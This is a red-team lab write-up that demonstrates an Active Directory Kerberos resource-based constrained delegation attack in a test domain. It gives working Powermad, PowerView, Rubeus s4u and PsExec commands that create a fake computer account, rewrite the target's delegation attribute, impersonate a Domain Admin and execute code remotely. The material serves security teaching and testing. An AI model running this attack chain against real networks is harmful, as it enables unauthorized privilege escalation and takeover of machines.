---
description: >-
  It's possible to gain code execution with elevated privileges on a remote
  computer if you have WRITE privilege on that computer's AD object.
---

# Kerberos Resource-based Constrained Delegation: Computer Object Takeover

This lab is based on a video presented by [@wald0](https://twitter.com/_wald0?lang=en) - [https://www.youtube.com/watch?v=RUbADHcBLKg\&feature=youtu.be](https://www.youtube.com/watch?v=RUbADHcBLKg\&feature=youtu.be)

### Overview

High level overview of the attack as performed in the lab:

* We have code execution on the box `WS02` in the context of `offense\sandy` user;
* User `sandy` has `WRITE` privilege over a target computer `WS01`;
* User `sandy` creates a new computer object `FAKE01` in Active Directory (no admin required);
* User `sandy` leverages the `WRITE` privilege on the `WS01` computer object and updates its object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means that the target computer `WS01` is happy for the computer `FAKE01` to impersonate any domain user and give them any access (even Domain Admin privileges) to `WS01`;
* `WS01` trusts `FAKE01` due to the modified `msDS-AllowedToActOnBehalfOfOtherIdentity`;
* We request Kerberos tickets for `FAKE01$` with ability to impersonate `offense\spotless` who is a Domain Admin;
* Profit - we can now access the `c$` share of `ws01` from the computer `ws02`.

#### Kerberos Delegation vs Resource Based Kerberos Delegation

* In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;
* In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.

### Requirements

|                                |                                                         |
| ------------------------------ | ------------------------------------------------------- |
| Target computer                | WS01                                                    |
| Admins on target computer      | [spotless@offense.local](mailto:spotless@offense.local) |
| Fake computer name             | FAKE01                                                  |
| Fake computer SID              | To be retrieved during attack                           |
| Fake computer password         | 123456                                                  |
| Windows 2012 Domain Controller | DC01                                                    |

Since the attack will entail creating a new computer object on the domain, let's check if users are allowed to do it - by default, a domain member usually can add up to 10 computers to the domain. To check this, we can query the root domain object and look for property `ms-ds-machineaccountquota`

```csharp
Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LavkxudZkK4r0WK3qOv%2F-Lavl6yaXMx88APlB94w%2FScreenshot%20from%202019-03-26%2020-49-58.png?alt=media\&token=dd579147-87fe-4a42-a899-64e57327531e)

The attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:

```csharp
Get-DomainController
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LavkxudZkK4r0WK3qOv%2F-LavmlVr3SxRKEimZew5%2FScreenshot%20from%202019-03-26%2020-56-15.png?alt=media\&token=f7c352f9-0984-4b97-8952-329656cbff0b)

Last thing to check - the target computer `WS01` object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set:

```
Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LavkxudZkK4r0WK3qOv%2F-LavoD7ACDXRd5D_OFvx%2FScreenshot%20from%202019-03-26%2021-03-32.png?alt=media\&token=43b2bee2-7414-48b4-937e-098c232a7de5)

This is the attribute the above command is referring to:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LavkxudZkK4r0WK3qOv%2F-LavpQa3anMAAe6b8ySJ%2FScreenshot%20from%202019-03-26%2021-08-47.png?alt=media\&token=3983f2d0-335f-4447-8498-b0dc0ebe4cac)

### Creating a new Computer Object

Let's now create a new computer object for our computer `FAKE01` (as referenced earlier in the requirements table) - this is the computer that will be trusted by our target computer `WS01` later on:

```csharp
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lavpmw0JWM-xeLRCUQt%2F-LavuSx2u0ebiaoNhiXN%2FScreenshot%20from%202019-03-26%2021-30-46.png?alt=media\&token=ca512afe-e65a-4f13-937e-95bc5101e3e7)

Checking if the computer got created and noting its SID:

```csharp
Get-DomainComputer fake01
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lb5NxGW0LwoCPap952I%2F-Lb5P4tr_W2qUSUz6ip-%2FScreenshot%20from%202019-03-28%2022-25-11.png?alt=media\&token=fe745f23-8783-4fe2-a570-8a38c841d7b9)

Create a new raw security descriptor for the `FAKE01` computer principal:

```csharp
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lb5NxGW0LwoCPap952I%2F-Lb5PRIVbtYMwfENRyYs%2FScreenshot%20from%202019-03-28%2022-26-41.png?alt=media\&token=672ea9e3-80c8-4c43-889e-d3959a50bb40)

### Modifying Target Computer's AD Object

Applying the security descriptor bytes to the target `WS01` machine:

```csharp
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lavpmw0JWM-xeLRCUQt%2F-Law92LgPV7tu7qNebFZ%2FScreenshot%20from%202019-03-26%2022-38-54.png?alt=media\&token=3956063c-c3c1-4eb8-b4ee-2c04b4753e60)

Reminder - we were able to write this because `offense\Sandy` belongs to security group `offense\Operations`, which has full control over the target computer `WS01$` although the only important one/enough is the `WRITE` privilege:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lavpmw0JWM-xeLRCUQt%2F-Law9Tf-GBhTvu_psSKM%2FScreenshot%20from%202019-03-26%2022-40-43.png?alt=media\&token=c7105b5e-f2bf-4788-a744-4841941368ac)

If our user did not have the required privileges, you could infer that from the verbose error message:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lavpmw0JWM-xeLRCUQt%2F-LawA5GmjKq6R_8lhZRi%2FScreenshot%20from%202019-03-26%2022-43-25.png?alt=media\&token=efab530e-b57f-4bd3-8345-35d6453234a7)

Once the `msDS-AllowedToActOnBehalfOfOtherIdentitity` is set, it is visible here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lavpmw0JWM-xeLRCUQt%2F-Law9pd1qZk6AcKeW34x%2FScreenshot%20from%202019-03-26%2022-42-18.png?alt=media\&token=97d18461-e34f-458a-a909-fc0b6ef8fa5d)

Same can be seen this way:

```csharp
Get-DomainComputer ws01 -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lavpmw0JWM-xeLRCUQt%2F-Law9fRLnkKRyLRP_Avy%2FScreenshot%20from%202019-03-26%2022-41-34.png?alt=media\&token=f2b05229-4c18-416d-a94e-bcbe82858ee1)

We can test if the security descriptor assigned to computer `ws01` in `msds-allowedtoactonbehalfofotheridentity` attribute refers to the `fake01$` machine:

```csharp
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
```

Note that the SID is referring to S-1-5-21-2552734371-813931464-1050690807-1154 which is the `fake01$` machine's SID - exactly what we want it to be:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lb5NxGW0LwoCPap952I%2F-Lb5OpZ4coo7iCwwp-rl%2FScreenshot%20from%202019-03-28%2022-24-04.png?alt=media\&token=392288b6-69da-4620-8b91-b41988d69f58)

### Execution

#### Generating RC4 Hash

Let's generate the RC4 hash of the password we set for the `FAKE01` computer:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LawA7a-cqS2nV1PoVhn%2F-LawAlId5_BENZRlTJdl%2FScreenshot%20from%202019-03-26%2022-46-25.png?alt=media\&token=60f0911d-e5a9-4b68-80b7-6875467099af)

#### Impersonation

Once we have the hash, we can now attempt to execute the attack by requesting a kerberos ticket for `fake01$` with ability to impersonate user `spotless` who is a Domain Admin:

```csharp
\\VBOXSVR\Labs\Rubeus\Rubeus\bin\Debug\rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/ws01.offense.local /ptt
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LawGlHAKlT5Llc7qM2p%2F-LawNFiAvC3xL-Xqzn3B%2FScreenshot%20from%202019-03-26%2023-40-45.png?alt=media\&token=6ad76353-fd1a-46cf-82d6-af391933c417)

Unfortunately, in my labs, I was not able to replicate the attack at first, even though according to rubeus, all the required kerberos tickets were created successfully - I could not gain remote admin on the target system `ws01`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LawGlHAKlT5Llc7qM2p%2F-LawNGr-11s5QhEnklHN%2FScreenshot%20from%202019-03-26%2023-40-57.png?alt=media\&token=49fc1858-1f1d-43bf-9ae1-0bfd160702f7)

Once again, checking kerberos tickets on the system showed that I had a TGS ticket for `spotless` for the CIFS service at `ws01.offense.local`, but the attack still did not work:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-Lb5JIWSTGr4HEVqF4Nu%2F-Lb5JhS4Hm2FQRBEit0Q%2FScreenshot%20from%202019-03-28%2022-01-23.png?alt=media\&token=00bffef4-116a-47a4-bfd8-b5772943450d)

#### Trial and Error

Talking to a couple of folks who had successfully simulated this attack in their labs, we still could not figure out what the issue was. After repeating the the attack over and over and carrying out various other troubleshooting steps, I finally found what the issue was.

Note how the ticket is for the SPN `cifs/ws01.offense.local` and we get access denied when attempting to access the remote admin shares of `ws01`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbId30hLzYyMS-LbuE8%2F-LbIfqQrTJ9Bd09Dr9vX%2FScreenshot%20from%202019-03-31%2013-16-17.png?alt=media\&token=dbbc71e8-5c27-47ec-b8fe-2c9fe1765d18)

#### Computer Take Over

Note, howerver if we request a ticket for SPN `cifs/ws01` - we can now access `C$` share of the `ws01` which means we have admin rights on the target system `WS01`:

```csharp
\\VBOXSVR\Tools\Rubeus\Rubeus.exe s4u /user:fake01$ /domain:offense.local /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:http/ws01 /altservice:cifs,host /ptt
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbId30hLzYyMS-LbuE8%2F-LbIj0EzkTsoGeBjm3x6%2FScreenshot%20from%202019-03-31%2013-31-17.png?alt=media\&token=61bfe629-9eaf-4121-8b88-93449d57cce2)

To further prove we have admin rights - we can write a simple file from `ws02` to `ws01` in c:\users\administrator:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbId30hLzYyMS-LbuE8%2F-LbIk9cfPuxzWMgvMnX1%2FScreenshot%20from%202019-03-31%2013-36-35.png?alt=media\&token=eefebe5c-6eda-422a-9a40-656c2d9c7637)

Additionally, check if we can remotely execute code with our noisy friend psexec:

```csharp
\\vboxsvr\tools\PsExec.exe \\ws01 cmd
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbId30hLzYyMS-LbuE8%2F-LbImNQWxchNw3NwZgYa%2FScreenshot%20from%202019-03-31%2013-44-20.png?alt=media\&token=3edeed7e-9579-4083-bd85-478826d67f84)

{% hint style="warning" %}
Note that the `offense\spotless` rights are effective only on the target system - i.e. on the system that delegated (`WS01`) another computer resource (`FAKE01`) to act on the target's (`WS01`) behalf and allow to impersonate any domain user.

In other words, an attack can execute code/commands as `offense\spotless` only on the `WS01` machine and not on any other machine in the domain.
{% endhint %}

### References

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" %}

{% embed url="https://github.com/Kevin-Robertson/Powermad" %}

{% embed url="https://decoder.cloud/2019/03/20/donkeys-guide-to-resource-based-constrained-delegation-from-standard-user-to-da/" %}
